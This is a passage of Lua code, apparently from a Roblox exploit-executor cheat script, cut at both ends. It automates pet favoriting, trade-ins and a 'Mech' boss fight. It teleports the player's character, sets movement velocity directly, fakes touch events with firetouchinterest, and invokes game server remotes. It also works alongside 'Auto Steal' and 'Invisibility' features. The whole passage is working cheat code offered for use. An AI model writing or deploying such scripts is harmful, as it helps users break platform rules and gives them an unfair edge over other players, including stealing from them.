				pcall(invokeWriteFavorite, uids, isFavorite)
				isMutateRunning = false
				taskScheduler.Wake()
			end)

			return true
		end

		local autoFavoriteToggle = nil
		local favoritePreviewStatus = nil

		taskScheduler.Add(function()
			local saveData = getMutateSaveData()
			if not saveData then
				return false
			end
			local isAutoFav = chilliState.Toggle(autoFavoriteToggle, false)
			local mutateList, mutateCount = getEggsToMutate(saveData)

			if favoritePreviewStatus and type(favoritePreviewStatus.Set) == "function" then
				local pairsFn = pairs
				local inventory = saveData.Inventory or {}
				local favCount = 0

				for _, eggData in pairsFn(inventory) do
					if type(eggData) == "table" and eggData.IsFavorite == true then
						favCount += 1
					end
				end

				pcall(favoritePreviewStatus.Set, favoritePreviewStatus, string.format("Favorite matches  -  %d pets, %d to mark  |  %d favorited", mutateCount, #mutateList, favCount))
			end

			local runningCheck = isMutateRunning
			local canAction

			if isMutateRunning then
				canAction = runningCheck
			else
				canAction = os.clock() < mutateActionStamp
			end

			if canAction then
				return false
			end

			if isAutoFav and executeMutateBatch(mutateList, true) then
				return false
			end

			if chilliState.Toggle(mutateStatusRow, false) then
				if executeMutateBatch(getEquippedToMutate(saveData, true, false), true) then
					return false
				end
			elseif chilliState.Toggle(mutateButtonHandle, false) then
				executeMutateBatch(getEquippedToMutate(saveData, false, isAutoFav), false)
			end

			return false
		end)

		favoritePreviewStatus = autoFavoriteSection:CreateText({ Name = "Favorite Preview", Text = "Favorite matches  -  0 pets" })

		autoFavoriteToggle = autoFavoriteSection:CreateToggle({
			Name = "Auto Favorite Pet",
			Note = "Favorite pets matching the rules below",
			Default = false,
			Callback = function()
				table.clear(mutateFailCache)
				taskScheduler.Wake()
			end,
		})

		autoFavoriteSection:CreateButton({
			Name = "Favorite Pets Now",
			Note = "Favorite matching pets once",
			ButtonText = "Favorite",
			ConfirmText = "Done!",
			SubOf = autoFavoriteToggle,
			Callback = function()
				local saveData = getMutateSaveData()

				if saveData then
					executeMutateBatch(getEggsToMutate(saveData), true)
				end
			end,
		})

		autoFavoriteSection:CreateDropdown({
			Name = "Favorite Rule",
			Note = "Pass any check or all checks",
			Options = mutateMatchModes,
			Default = mutateMatchModes[2],
			SubOf = autoFavoriteToggle,
			Callback = function(val)
				if table.find(mutateMatchModes, val) then
					mutateMatchMode = val
					taskScheduler.Wake()
				end
			end,
		})

		autoFavoriteSection:CreateDropdown({
			Name = "Favorite Min Rarity",
			Note = "Favorite pets of the chosen rarity and every rarity above it (Off = skip)",
			Options = mutateRarityList,
			Default = "Off",
			SubOf = autoFavoriteToggle,
			Callback = function(val)
				mutateMinRarity = mutateRarityMap[val]
				taskScheduler.Wake()
			end,
		})

		hookDropdownAllLabel(autoFavoriteSection:CreateMultiDropdown({
			Name = "Favorite Mutations",
			Note = "Mutation check (empty = skip)",
			Options = mutateFilterOptions,
			Default = {},
			SubOf = autoFavoriteToggle,
			Callback = function(valList)
				local targetMap = {}
				local hasAny = false

				if type(valList) == "table" then
					for k, v in pairs(valList) do
						k = v == true and type(k) == "string" and k

						if k then
							v = k
						else
							v = type(v) == "string" and v
						end

						local item = v or nil

						if item == anyMutString then
							hasAny = true
						elseif item then
							targetMap[mutateFilterMap[item] or item] = true
						end
					end
				end

				mutateAnyMutation = hasAny
				mutateTargetMutations = targetMap
				taskScheduler.Wake()
			end,
		}))

		local multiplierMap = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
		}

		local valNum = 0
		local valSuffix = "M/s"

		local function updateMutateVal(numArg, strArg)
			if numArg ~= nil then
				valNum = math.max(0, math.floor(tonumber(numArg) or valNum))
			end

			if strArg ~= nil then
				valSuffix = tostring(strArg)
			end

			mutateMinIncome = valNum * (multiplierMap[valSuffix] or multiplierMap["M/s"]).Mult
			taskScheduler.Wake()
		end

		formatNumberSuffix(autoFavoriteSection, {
			Name = "Min Favorite Value",
			Note = "Value check (0 = skip)",
			SubOf = autoFavoriteToggle,
			Legacy = "Favorite Min Value",
			SectionName = "Auto Favorite",
			OnRaw = function(val)
				updateMutateVal(math.floor(val / 1000), "K/s")
			end,
		})

		hookDropdownAllLabel(autoFavoriteSection:CreateMultiDropdown({
			Name = "Always Favorite Species",
			Note = "Always favorite these species",
			Options = mutateEggOptions,
			Default = {},
			SubOf = autoFavoriteToggle,
			Callback = function(valList)
				local ignoreMap = {}

				if type(valList) == "table" then
					for k, v in pairs(valList) do
						k = v == true and type(k) == "string" and k or type(v) == "string" and v
						local item = k or nil

						if item and mutateEggToCategoryMap[item] then
							ignoreMap[mutateEggToCategoryMap[item]] = true
						end
					end
				end

				mutateIgnoredCategories = ignoreMap
				taskScheduler.Wake()
			end,
		}))

		autoFavoriteEquippedToggle = autoFavoriteSection:CreateToggle({
			Name = "Auto Favorite Equipped",
			Note = "Keep equipped pets favorited",
			Default = false,
			Callback = function()
				taskScheduler.Wake()
			end,
		})

		autoUnfavoriteEquippedToggle = autoFavoriteSection:CreateToggle({
			Name = "Auto Unfavorite Equipped",
			Note = "Unfavorite equipped pets not in the rules",
			Default = false,
			Callback = function()
				taskScheduler.Wake()
			end,
		})

		autoFavoriteSection:CreateButton({
			Name = "Favorite Equipped Now",
			Note = "Favorite all equipped pets once",
			ButtonText = "Favorite",
			ConfirmText = "Done!",
			Callback = function()
				local saveData = getMutateSaveData()

				if saveData then
					executeMutateBatch(getEquippedToMutate(saveData, true, false), true)
				end
			end,
		})

		autoFavoriteSection:CreateButton({
			Name = "Unfavorite Equipped Now",
			Note = "Unfavorite all equipped pets once",
			ButtonText = "Unfavorite",
			ConfirmText = "Done!",
			Callback = function()
				local saveData = getMutateSaveData()

				if saveData then
					executeMutateBatch(getEquippedToMutate(saveData, false, false), false)
				end
			end,
		})
	end

	local saveModuleFav = gameModules.Save

	if type(saveModuleFav) == "table" and type(saveModuleFav.FieldSignal) == "function" then
		for _, fieldName in ipairs({ "Inventory", "EquippedAssets" }) do
			local ok, fieldSignal = pcall(saveModuleFav.FieldSignal, fieldName)

			if ok and type(fieldSignal) == "table" and type(fieldSignal.Connect) == "function" then
				local ok2, conn = pcall(fieldSignal.Connect, fieldSignal, function()
					taskScheduler.Wake()
				end)

				if ok2 and conn then
					trackCleanup(function()
						pcall(function()
							conn:Disconnect()
						end)
					end)
				end
			end
		end
	end

	chilliState.MechBoot = function(section)
		local hasHazards, scrambleHazards = pcall(function()
			return require(ReplicatedStorage.Shared.Util.ScrambleBossHazards)
		end)

		local mech = {
			Handle = nil,
			Row = nil,
			Status = "Idle",
			Shown = nil,
			Busy = false,
			Generation = 0,
			Hazards = {},
			TravelSpeed = 250,
			Radius = 18,
			SwingGap = 0.12,
			Dodge = true,
			TryBall = true,
			Leave = true,
			BaitSpeed = 225,
			Interval = 1800,
			Run = nil,
			SwapTools = true,
			SwapIndex = 1,
			SwapSince = 0,
			MainHold = 0.3,
			SecondHold = 0.4,
			LastSwing = 0,
			Links = {},
		}

		chilliState.Mech = mech

		local function isMechEnabled()
			return chilliState.Toggle(mech.Handle, false) == true
		end

		local function getArena()
			return workspace:FindFirstChild("ScrambleArena")
		end

		local function getArenaPortal()
			return workspace:FindFirstChild("ScrambleArenaPortal")
		end

		local function isInArena()
			return localPlayer:GetAttribute("InScrambleArena") == true
		end

		mech.StealFirst = function()
			local steal = chilliState.Steal
			local movement = chilliState.Movement
			if movement.PlaceWanted == true then
				return "Auto Place Egg goes first"
			end

			if movement.MutationWanted == true then
				return "Scrambled Mutation goes first"
			end
			local isAutoStealOn = chilliState.Toggle(autoStealToggle, false) == true and steal ~= nil
			local shouldStealRun

			if isAutoStealOn then
				shouldStealRun = steal.Wanted == true or steal.Carrying == true or steal.Active == true
			else
				shouldStealRun = isAutoStealOn
			end

			if shouldStealRun then
				return "Auto Steal goes first"
			end
			return nil
		end

		pcall(function()
			local scheduleIntervalSeconds = require(ReplicatedStorage.Shared.Flags.ScrambleBossFlags).ScheduleIntervalSeconds
			local interval = type(scheduleIntervalSeconds) == "table" and tonumber(scheduleIntervalSeconds.Value) or nil

			if interval and interval > 0 then
				mech.Interval = interval
			end
		end)

		mech.Clock = function(seconds)
			local rounded = math.max(0, math.floor(seconds + 0.5))
			return string.format("%d:%02d", math.floor(rounded / 60), rounded % 60)
		end

		mech.Timer = function()
			local serverTimeNow = workspace:GetServerTimeNow()
			local scrambleArena = workspace:FindFirstChild("ScrambleArena")
			local spawnsAt = scrambleArena and tonumber(scrambleArena:GetAttribute("SpawnsAt")) or 0

			if workspace:FindFirstChild("ScrambleArenaPortal") then
				if serverTimeNow < spawnsAt then
					return "Mech portal is open  |  boss spawns in " .. mech.Clock(spawnsAt - serverTimeNow)
				end
				return "Mech portal is open now"
			end

			local interval = mech.Interval
			return "Next Mech portal in " .. mech.Clock(math.ceil(serverTimeNow / interval) * interval - serverTimeNow)
		end

		local function findHitbox(instance)
			if not instance then
				return nil
			end
			local hitbox = instance:FindFirstChild("Hitbox", true)
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox
			end

			for _, descendant in ipairs(instance:GetDescendants()) do
				if descendant:IsA("TouchTransmitter") and descendant.Parent and descendant.Parent:IsA("BasePart") then
					return descendant.Parent
				end
			end

			return nil
		end

		local function touchHitbox(hitboxPart)
			local rootPart = chilliState.Root()
			if not rootPart or not hitboxPart or type(firetouchinterest) ~= "function" then
				return
			end

			pcall(function()
				firetouchinterest(rootPart, hitboxPart, 0)
				task.wait(0.05)
				firetouchinterest(rootPart, hitboxPart, 1)
			end)
		end

		local function isHazardAt(pos, timeNow)
			if not mech.Dodge or not hasHazards or type(scrambleHazards) ~= "table" or type(scrambleHazards.Contains) ~= "function" then
				return false
			end

			for k, hazard in pairs(mech.Hazards) do
				local triggerAt = tonumber(hazard.At) or 0
				local warnTime = tonumber(hazard.Warn) or 0
				if timeNow > triggerAt + (tonumber(hazard.Duration) or 0.5) + 1.5 then
					mech.Hazards[k] = nil
					continue
				end

				if timeNow >= triggerAt - warnTime - 0.1 then
					local ok2, containsResult = pcall(scrambleHazards.Contains, hazard, pos, timeNow)
					if ok2 and containsResult then
						return true
					end
				end
			end

			return false
		end

		local function findScramblerTool()
			local character = localPlayer.Character
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, container in ipairs({ character, backpack }) do
				if container then
					for _, child in ipairs(container:GetChildren()) do
						if child:IsA("Tool") and tostring(child:GetAttribute("ItemType")) == "Gear" then
							if string.find(string.lower(tostring(child:GetAttribute("GearName") or "")), "scrambler", 1, true) then
								return child
							end
						end
					end
				end
			end

			return nil
		end

		local function mechSwingTool()
			local lastSwing = mech.LastSwing
			if os.clock() - lastSwing < mech.SwingGap then
				return
			end
			mech.LastSwing = os.clock()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local batTool = type(chilliState.FindBat) == "function" and chilliState.FindBat() or nil
			local scramblerTool = mech.SwapTools and findScramblerTool() or nil
			local toolToUse

			if batTool and scramblerTool and batTool ~= scramblerTool then
				local holdDuration = mech.SwapIndex == 2 and mech.SecondHold or mech.MainHold
				local swapSince = mech.SwapSince

				if holdDuration <= os.clock() - swapSince then
					mech.SwapIndex = mech.SwapIndex == 2 and 1 or 2
					mech.SwapSince = os.clock()
				end

				toolToUse = mech.SwapIndex == 2 and scramblerTool or batTool
			else
				toolToUse = batTool or scramblerTool
			end

			if not toolToUse or not humanoid then
				return
			end

			if toolToUse.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(toolToUse)
				end)
			end

			pcall(function()
				toolToUse:Activate()
			end)
		end

		local function mechTeleportTo(targetPos, lookAtPos)
			local character = localPlayer.Character
			local rootPart = chilliState.Root()
			if not character or not rootPart then
				return
			end

			if (rootPart.Position - targetPos).Magnitude > 3 then
				pcall(function()
					character:PivotTo(CFrame.lookAt(targetPos, Vector3.new(lookAtPos.X, targetPos.Y, lookAtPos.Z)))
					rootPart.AssemblyLinearVelocity = Vector3.zero
				end)
			end
		end

		local function findBossHitbox(arena)
			local mechBoss = arena:FindFirstChild("Mech")
			local hitbox = mechBoss and mechBoss:FindFirstChild("Hitbox")
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox.Position, mechBoss
			end

			for _, child in ipairs(arena:GetChildren()) do
				if child:IsA("Model") and child.Name ~= "Ball" and child.Name ~= "LeaveTeleport" and child.Name ~= "Structure" then
					local childHitbox = child:FindFirstChild("Hitbox")
					if childHitbox and childHitbox:IsA("BasePart") then
						return childHitbox.Position, child
					end
				end
			end

			return nil, nil
		end

		local function runBallPhase(arena, rootPart)
			local ball = arena:FindFirstChild("Ball")
			if not ball then
				return false
			end
			local position = ball:GetBoundingBox().Position
			local floorY = (tonumber(arena:GetAttribute("FloorY")) or position.Y) + 3
			local coreStage = tonumber(arena:GetAttribute("CoreStage")) or 0

			if arena:GetAttribute("BallStunned") == true then
				mech.Run = nil
				local offsetVector = Vector3.new(rootPart.Position.X - position.X, 0, rootPart.Position.Z - position.Z)
				local direction = offsetVector.Magnitude > 1 and offsetVector.Unit or Vector3.new(1, 0, 0)
				mechTeleportTo(Vector3.new(position.X, floorY, position.Z) + direction * 10, position)
				mechSwingTool()
				mech.Status = string.format("Smashing the core  |  stage %d / 3  |  core %s", coreStage, tostring(arena:GetAttribute("CoreHealth") or "?"))
				return true
			end

			local ballTargetStr = tostring(arena:GetAttribute("BallTarget"))
			local ballCoil = arena:GetAttribute("BallCoil")

			if not mech.Run and ballTargetStr == tostring(localPlayer.UserId) and type(ballCoil) == "string" and ballCoil ~= "" then
				local coils = arena:FindFirstChild("Coils")
				coils = coils and coils:FindFirstChild(ballCoil)
				coils = coils and coils:GetAttribute("Home")

				if typeof(coils) == "Vector3" then
					local coilOffset = Vector3.new(coils.X - position.X, 0, coils.Z - position.Z)

					if coilOffset.Magnitude > 1 then
						local goalOffset = coilOffset.Unit * 40
						mech.Run = { Goal = Vector3.new(coils.X, floorY, coils.Z) + goalOffset, Until = os.clock() + 8, Coil = ballCoil }
					end
				end
			end

			if mech.Run then
				local runOffset = Vector3.new(mech.Run.Goal.X - rootPart.Position.X, 0, mech.Run.Goal.Z - rootPart.Position.Z)
				local isAtGoal = runOffset.Magnitude < 4

				if not isAtGoal then
					local until_ = mech.Run.Until
					isAtGoal = os.clock() > until_
				end

				if isAtGoal then
					mech.Run = nil

					pcall(function()
						rootPart.AssemblyLinearVelocity = Vector3.new(0, rootPart.AssemblyLinearVelocity.Y, 0)
					end)
				else
					local baitVector = runOffset.Unit * mech.BaitSpeed

					pcall(function()
						rootPart.AssemblyLinearVelocity = Vector3.new(baitVector.X, rootPart.AssemblyLinearVelocity.Y, baitVector.Z)
					end)

					mech.Status = string.format("Baiting the ball into %s  |  stage %d / 3", mech.Run.Coil, coreStage)
				end

				return true
			end

			local offsetVector = Vector3.new(rootPart.Position.X - position.X, 0, rootPart.Position.Z - position.Z)

			if offsetVector.Magnitude > 18 or offsetVector.Magnitude < 6 then
				local dodgeDir = offsetVector.Magnitude < 1 and Vector3.new(1, 0, 0) or offsetVector.Unit
				mechTeleportTo(Vector3.new(position.X, floorY, position.Z) + dodgeDir * 12, position)
			end

			mech.Status = string.format("Ball phase, waiting for it to lock on  |  stage %d / 3", coreStage)
			return true
		end

		local function runHumanPhase(arena, rootPart)
			local scrambleHuman = arena:FindFirstChild("ScrambleHuman")
			if not scrambleHuman then
				return false
			end
			local hrp = scrambleHuman:FindFirstChild("HumanoidRootPart") or scrambleHuman.PrimaryPart or scrambleHuman:FindFirstChildWhichIsA("BasePart")
			local hrpPos = hrp and hrp.Position or scrambleHuman:GetPivot().Position
			hrp = hrp and hrp.AssemblyLinearVelocity or Vector3.zero
			local predictedPos = hrpPos + Vector3.new(hrp.X, 0, hrp.Z) * 0.15
			local offset = Vector3.new(rootPart.Position.X - predictedPos.X, 0, rootPart.Position.Z - predictedPos.Z)
			local dodgeVector = offset.Magnitude > 1 and offset.Unit * 5 or Vector3.zero
			local targetPos = Vector3.new(predictedPos.X, rootPart.Position.Y, predictedPos.Z) + dodgeVector
			local character = localPlayer.Character

			pcall(function()
				character:PivotTo(CFrame.lookAt(targetPos, Vector3.new(hrpPos.X, targetPos.Y, hrpPos.Z)))
			end)

			mechSwingTool()
			mech.Status = string.format("Chasing Dr Scramble  |  hits %s / %s", tostring(arena:GetAttribute("HumanHits") or 0), tostring(arena:GetAttribute("HumanNeeded") or 3))
			return true
		end

		local function mechLoopStep()
			local arena = getArena()
			local rootPart = chilliState.Root()
			local character = localPlayer.Character
			character = character and character:FindFirstChildOfClass("Humanoid")
			if not arena or not rootPart then
				return
			end
			local phase = tostring(arena:GetAttribute("Phase"))
			local health = tonumber(arena:GetAttribute("Health")) or 0
			local maxHealth = tonumber(arena:GetAttribute("MaxHealth")) or 0

			if tostring(arena:GetAttribute("GrabVictim")) == tostring(localPlayer.UserId) and character then
				character.Jump = true
				mechSwingTool()
				mech.Status = "Grabbed, breaking free"
				return
			end

			if phase == "Ball" and mech.TryBall and runBallPhase(arena, rootPart) then
				return
			end

			if phase == "Human" and runHumanPhase(arena, rootPart) then
				return
			end
			local bossHitboxPos, bossInstance = findBossHitbox(arena)

			if not bossHitboxPos then
				local spawnTimer = (tonumber(arena:GetAttribute("SpawnsAt")) or 0) - workspace:GetServerTimeNow()
				mech.Status = spawnTimer > 0 and "In the arena  |  boss spawns in " .. mech.Clock(spawnTimer) or string.format("Phase %s, waiting for the boss", phase)
				return
			end

			local serverTimeNow = workspace:GetServerTimeNow()
			local floorY = (tonumber(arena:GetAttribute("FloorY")) or bossHitboxPos.Y) + 3
			local bestDist = nil
			local bestPos = nil

			for i = 0, 15 do
				local angle = i / 16 * 3.1415926535897931 * 2
				local radius = mech.Radius
				local hitboxZ = bossHitboxPos.Z
				local radius2 = mech.Radius
				local targetPos = Vector3.new(bossHitboxPos.X + math.cos(angle) * radius, floorY, hitboxZ + math.sin(angle) * radius2)
				local distance = (targetPos - rootPart.Position).Magnitude

				if isHazardAt(targetPos, serverTimeNow) or isHazardAt(targetPos, serverTimeNow + 0.4) then
					distance += 10000
				end

				if not bestDist or distance < bestDist then
					bestDist = distance
					bestPos = targetPos
				end
			end

			if bestPos then
				mechTeleportTo(bestPos, bossHitboxPos)
			end

			mechSwingTool()
			local isOverheated = bossInstance and bossInstance:GetAttribute("Overheated") == true
			mech.Status = string.format("Fighting %s  |  boss %d / %d%s", phase, math.floor(health + 0.5), math.floor(maxHealth + 0.5), isOverheated and "  |  OVERHEAT" or "")
		end

		local function mechLeaveArena()
			local arena = getArena()
			local leaveHitbox = findHitbox(arena and arena:FindFirstChild("LeaveTeleport"))
			if not leaveHitbox then
				return
			end
			local character = localPlayer.Character

			pcall(function()
				character:PivotTo(CFrame.new(leaveHitbox.Position + Vector3.new(0, 3, 0)))
			end)

			task.wait(0.2)
			touchHitbox(leaveHitbox)
		end

		local function mechEnterArena(generation)
			local portal = getArenaPortal()
			local portalHitbox = findHitbox(portal)
			if not portal or not portalHitbox then
				return false
			end
			local homePos = type(chilliState.StealHome) == "function" and chilliState.StealHome() or nil

			if homePos and chilliState.InsideBase() then
				local isRespawned = mech.Respawned == true
				local safeZoneExitPos = homePos + Vector3.new(0, 3, 0)
				local travelSpeed = isRespawned and math.min(mech.TravelSpeed, 300) or mech.TravelSpeed
				local startTime = os.clock()
				local loopBreakState = nil

				while true do
					if not (os.clock() - startTime < 20) then
						loopBreakState = 1
						break
					else
						if generation ~= mech.Generation or not isMechEnabled() or isInArena() or mech.StealFirst() then
							loopBreakState = 2
							break
						else
							local rootPart = chilliState.Root()

							if rootPart then
								local offset = safeZoneExitPos - rootPart.Position

								if offset.Magnitude <= 4 then
									loopBreakState = 1
									break
								else
									mech.Status = isRespawned and "Respawned, going out through the safe zone" or "Leaving the base through the safe zone"
									local distance = offset.Magnitude
									local stepMove = math.min(travelSpeed * RunService.Heartbeat:Wait(), distance)

									pcall(function()
										local rotation = rootPart.CFrame.Rotation
										rootPart.CFrame = CFrame.new(rootPart.Position + offset.Unit * stepMove) * rotation
										rootPart.AssemblyLinearVelocity = Vector3.zero
									end)

									continue
								end
							end
						end

						break
					end
				end

				if loopBreakState ~= 1 then
					if loopBreakState == 2 then
						return false
					end
					return false
				end

				if isRespawned then
					mech.Status = "Respawned, resting in the safe zone"
					local restTimer = 0

					while restTimer < 0.75 do
						local rootPart = chilliState.Root()

						if rootPart then
							pcall(function()
								rootPart.AssemblyLinearVelocity = Vector3.zero
							end)
						end

						restTimer += RunService.Heartbeat:Wait()
					end
				end
			end

			mech.Respawned = false
			local targetPos = portalHitbox.Position
			local startTime = os.clock()
			local loopBreakState2 = nil
			local rootPart

			while true do
				if not (os.clock() - startTime < 60) then
					loopBreakState2 = 1
					break
				else
					if generation ~= mech.Generation or not isMechEnabled() or isInArena() or mech.StealFirst() then
						loopBreakState2 = 1
						break
					else
						rootPart = chilliState.Root()

						if not rootPart then
							loopBreakState2 = 2
							break
						else
							local offset = Vector3.new(targetPos.X - rootPart.Position.X, 0, targetPos.Z - rootPart.Position.Z)

							if not (offset.Magnitude <= 14) then
								local velocity = offset.Unit * math.min(mech.TravelSpeed, offset.Magnitude / 0.05)
								mech.Status = string.format("Going to the Mech portal, %d studs", math.floor(offset.Magnitude + 0.5))

								pcall(function()
									rootPart.AssemblyLinearVelocity = Vector3.new(velocity.X, rootPart.AssemblyLinearVelocity.Y, velocity.Z)
								end)

								RunService.Heartbeat:Wait()
								continue
							end
						end
					end

					break
				end
			end

			if loopBreakState2 ~= 1 then
				if loopBreakState2 == 2 then
					return false
				end

				pcall(function()
					rootPart.AssemblyLinearVelocity = Vector3.zero
				end)

				touchHitbox(portalHitbox)
				task.wait(0.4)

				if not isInArena() then
					pcall(function()
						local rfScrambleBossEnterArena = networking:FindFirstChild("RF/ScrambleBoss/EnterArena")

						if rfScrambleBossEnterArena then
							rfScrambleBossEnterArena:InvokeServer()
						end
					end)
				end
			end

			local startTime2 = os.clock()

			while not isInArena() and os.clock() - startTime2 < 5 do
				task.wait(0.1)
			end

			return isInArena()
		end

		local function mechStartLoop()
			mech.Busy = true
			mech.Generation = mech.Generation + 1
			local generation = mech.Generation
			chilliState.Shield("mech", true)

			pcall(function()
				if chilliState.Treadmill and chilliState.Treadmill.Riding or type(chilliState.OnBelt) == "function" and chilliState.OnBelt() then
					chilliState.ExitBelt()
				end
			end)

			if not isInArena() and not mech.StealFirst() then
				pcall(mechEnterArena, generation)
			end

			while generation == mech.Generation and isMechEnabled() and isInArena() and not mech.StealFirst() do
				local arena = getArena()
				local phase = arena and tostring(arena:GetAttribute("Phase")) or ""

				if phase == "Defeated" or phase == "Final" or phase == "Ended" or phase == "Won" then
					mech.Status = "Dr Scramble defeated, going back home"
					mech.DefeatedAt = mech.DefeatedAt or os.clock()
					local leave = mech.Leave

					if leave then
						local defeatedAt = mech.DefeatedAt
						leave = os.clock() - defeatedAt > 15
					end

					if leave then
						pcall(mechLeaveArena)
						task.wait(2)
					else
						task.wait(0.3)
					end
				else
					pcall(mechLoopStep)
					RunService.Heartbeat:Wait()
				end
			end

			if isInArena() and mech.StealFirst() then
				mech.Status = tostring(mech.StealFirst()) .. ", leaving the arena"
				pcall(mechLeaveArena)
				local waitTimer = 0

				while isInArena() and waitTimer < 5 do
					waitTimer += task.wait(0.2)
				end
			end

			mech.DefeatedAt = nil
			mech.Run = nil
			chilliState.Shield("mech", false)
			chilliState.ReleaseMovement("mech")
			mech.Busy = false
			taskScheduler.Wake()
		end

		pcall(function()
			local reScrambleBossHazard = networking:FindFirstChild("RE/ScrambleBoss/Hazard")

			if reScrambleBossHazard and reScrambleBossHazard:IsA("RemoteEvent") then
				table.insert(mech.Links, reScrambleBossHazard.OnClientEvent:Connect(function(eventData)
					if type(eventData) == "table" then
						mech.Hazards[eventData.Id or #mech.Hazards + 1] = eventData
					end
				end))
			end
		end)

		table.insert(mech.Links, localPlayer.CharacterAdded:Connect(function()
			mech.Respawned = true
		end))

		mech.Row = section:CreateText({ Name = "Mech Status", Text = "Idle" })

		mech.Handle = section:CreateToggle({
			Name = "Auto Mech Boss",
			Default = false,
			Callback = function()
				if not isMechEnabled() then
					mech.Generation = mech.Generation + 1
				end

				taskScheduler.Wake()
			end,
		})

		for _, mechSetting in ipairs({
			{ "Mech Tween Speed", 100, 1000, 250, 10, "studs/s", "TravelSpeed" },
			{ "Main Weapon Hold", 0, 1.5, 0.3, 0.01, "s", "MainHold" },
			{ "Scrambler Hold", 0, 1.5, 0.4, 0.01, "s", "SecondHold" },
		}) do
			section:CreateSlider({
				Name = mechSetting[1],
				Min = mechSetting[2],
				Max = mechSetting[3],
				Default = mechSetting[4],
				Increment = mechSetting[5],
				Unit = mechSetting[6],
				SubOf = mech.Handle,
				Callback = function(val)
					mech[mechSetting[7]] = math.clamp(tonumber(val) or mechSetting[4], mechSetting[2], mechSetting[3])
				end,
			})
		end

		for _, mechSetting in ipairs({
			{ "Swap Two Weapons", "SwapTools" },
			{ "Dodge Attacks", "Dodge" },
			{ "Ball And Core Phase", "TryBall" },
			{ "Leave After Fight", "Leave" },
		}) do
			section:CreateToggle({
				Name = mechSetting[1],
				Default = true,
				SubOf = mech.Handle,
				Callback = function(val)
					mech[mechSetting[2]] = val ~= false
				end,
			})
		end

		taskScheduler.Add(function()
			local row = mech.Row

			if not isMechEnabled() then
				mech.Status = "Off  |  " .. mech.Timer()
			elseif not mech.Busy then
				if isInArena() then
					mech.Status = "In the arena"
				else
					mech.Status = mech.Timer()
				end
			end

			if row and mech.Shown ~= mech.Status and type(row.Set) == "function" then
				mech.Shown = mech.Status
				pcall(row.Set, row, mech.Status)
			end

			local invisibilityHandle = chilliState.InvisibilityHandle
			local isInvisEnabled = invisibilityHandle ~= nil and chilliState.Toggle(invisibilityHandle, false)

			if isMechEnabled() and (mech.Busy or isInArena() or getArenaPortal()) then
				mech.InvisResumeAt = nil

				if not chilliState.InvisMech then
					chilliState.InvisMech = true

					if isInvisEnabled then
						chilliState.Notify("Invisibility", "Invisibility is paused for the Mech boss and comes back after it.")
					end
				end
			elseif chilliState.InvisMech and not mech.Busy then
				mech.InvisResumeAt = mech.InvisResumeAt or os.clock() + 5

				if mech.InvisResumeAt <= os.clock() then
					mech.InvisResumeAt = nil
					chilliState.InvisMech = false

					if isInvisEnabled then
						chilliState.Notify("Invisibility", "The Mech boss is over, Invisibility is back on.")
					end
				end
			end

			if not isMechEnabled() or mech.Busy then
				return true
			end

			if isInArena() or getArenaPortal() then
				local prioritizeReason = mech.StealFirst()
				if prioritizeReason then
					mech.Status = prioritizeReason .. "  |  " .. mech.Timer()
					return true
				end
				local character = localPlayer.Character
				if character and character:GetAttribute("InvisApplied") == true then
					mech.Status = "Leaving Invisibility for the boss"
					return true
				end

				if not chilliState.ClaimMovement("mech") then
					mech.Status = "Waiting for " .. tostring(chilliState.Movement.Owner or "movement")
					return true
				end
				task.spawn(mechStartLoop)
				return true
			end

			return true
		end)

		trackCleanup(function()
			chilliState.InvisMech = false
			mech.Generation = mech.Generation + 1

			for _, link in ipairs(mech.Links) do
				pcall(function()
					link:Disconnect()
				end)
			end

			pcall(chilliState.Shield, "mech", false)
			pcall(chilliState.ReleaseMovement, "mech")
		end)
	end

	chilliState.MechBoot(scrambleSection)

	do
		local labActionCooldown = 5
		local labCheckCooldown = 5
		local autoTradeInHandle = nil
		local autoRerollHandle = nil
		local isTradeInRunning = false
		local tradeInActionStamp = 0
		local nextTradeInAction = 0
		local nextLabCheck = 0
		local labStateCache = nil
		local labCheckTime = 0
		local labStatusText = ""
		local isLabUIUpdateRunning = false

		local function invokeLabRemote(remoteName, args)
			local remoteObj = networking:FindFirstChild(remoteName)
			if not remoteObj or not remoteObj:IsA("RemoteFunction") then
				return false, nil, nil
			end

			if args == nil then
				return pcall(remoteObj.InvokeServer, remoteObj)
			end
			return pcall(remoteObj.InvokeServer, remoteObj, args)
		end

		local function getLabSaveData()
			local saveModule = gameModules.Save
			if type(saveModule) ~= "table" or type(saveModule.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(saveModule.Get)
			return ok and type(result) == "table" and result or nil
		end

		local function getEggDisplayName(categoryId)
			local directory = gameModules.Assets and gameModules.Assets.Directory
			local catData = type(directory) == "table" and directory[tostring(categoryId)] or nil
			return tostring(type(catData) == "table" and catData.DisplayName or categoryId)
		end

		local function getLabState(forceRefresh)
			if not forceRefresh and type(labStateCache) == "table" and os.clock() < nextLabCheck then
				return labStateCache
			end
			nextLabCheck = os.clock() + labCheckCooldown
			local fetchOk, newState = invokeLabRemote("RF/ScrambleTradeIn/AskState")

			if fetchOk and type(newState) == "table" then
				labStateCache = newState
				labCheckTime = os.clock()
			end

			return labStateCache
		end

		local function getTradeInBatch(labState, saveData)
			local requirements = type(labState) == "table" and labState.Requirements or nil
			if type(requirements) ~= "table" or #requirements == 0 then
				return nil, "No active recipe"
			end
			local equippedMap = {}

			if type(saveData.EquippedAssets) == "table" then
				for _, equippedAsset in pairs(saveData.EquippedAssets) do
					equippedMap[equippedAsset] = true
				end
			end

			local candidatesByReq = {}

			for _, requirement in ipairs(requirements) do
				candidatesByReq[tostring(requirement)] = {}
			end

			local pairsFn = pairs
			local inventory = saveData.Inventory or {}

			for uid, eggData in pairsFn(inventory) do
				local reqCandidates = type(eggData) == "table" and candidatesByReq[tostring(eggData.Category)] or nil

				if reqCandidates and eggData.InFuse ~= true and eggData.IsFavorite ~= true and not equippedMap[uid] then
					local isMutated = type(eggData.Mutations) == "table" and next(eggData.Mutations) ~= nil
					table.insert(reqCandidates, { Uid = uid, Scale = tonumber(eggData.Scale) or 0, Mutated = isMutated })
				end
			end

			for _, reqCandidates in pairs(candidatesByReq) do
